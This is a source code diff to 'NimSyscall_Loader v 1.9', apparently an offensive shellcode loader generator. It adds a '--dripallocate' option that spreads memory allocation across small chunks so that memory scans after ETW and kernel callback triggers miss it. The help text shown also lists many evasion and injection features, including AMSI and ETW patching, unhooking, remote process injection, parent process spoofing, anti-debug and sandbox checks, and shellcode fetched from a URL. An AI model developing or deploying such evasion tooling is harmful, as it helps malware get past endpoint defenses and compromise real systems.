@@ -65,7 +65,7 @@ let helpmenu = """
 NimSyscall_Loader v 1.9
 
 Usage:
-  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --remoteMapSection --unhook --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --sourceonly --jmpEntry --jmpEntryDLL=<example.dll> --jmpEntryFunc=<exampleFunc>]
+  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --remoteMapSection --unhook --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --sourceonly --jmpEntry --jmpEntryDLL=<example.dll> --jmpEntryFunc=<exampleFunc> --dripallocate]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -164,6 +164,7 @@ Options:
 [shellcode specific]
 
   --shellcode    Encrypt shellcode to load it on runtime
+  --dripallocate    Allocate memory Driploader style (multiple small memory chunks after another to avoid memory scans after ETWti/Kernel Callback triggers)
   --CallbackExecute    Execute shellcode via a custom Callback function
   --localCreateThread    Use NtCreateThreadEx for local injection instead of a direct pointer to the shellcode
   --QueueApc    Instead of a direct Pointer or Thread Creation execute the Shellcode via NtQueueApcThread
@@ -303,6 +304,7 @@ var
     jmpEntry: bool = false
     jmpEntryDLL: string = "ntdll.dll"
     jmpEntryFunction: string = "RtlpWow64CtxFromAmd64"
+    dripallocate: bool = false
 
 let args = docopt(helpmenu, version = "NimSyscall_Loader 1.9")
 
@@ -367,6 +369,9 @@ if args["--jmpEntryDLL"]:
 if args["--jmpEntryFunc"]:
     let funcname = args["--jmpEntryFunc"]
     jmpEntryFunction = fmt"{funcname}"
+
+if args["--dripallocate"]:
+    dripallocate = true
 
 if args["--csharp"]:
   csharp = true
@@ -2342,6 +2347,9 @@ if (remoteETWpatch or remoteAMSIpatch or jmpEntry):
 if(jmpEntry):
     stub.add(CustomThreadEntryStub)
 
+if(dripallocate):
+    stub.add(DripAllocateStub)
+
 stub.add(MainStub)
 
 stub.add(getRandStub())
@@ -2665,6 +2673,9 @@ elif (retrieveFromURL):
     stub.add(ShellcodefromURLStub)
 else:
     basicCompileFlags.add("-d:PayloadEmbedded ")
+
+if(dripallocate):
+    basicCompileFlags.add("-d:AllocateDripStyle ")
 
 if(antidebug):
     basicCompileFlags.add("-d:AntiDebug ")
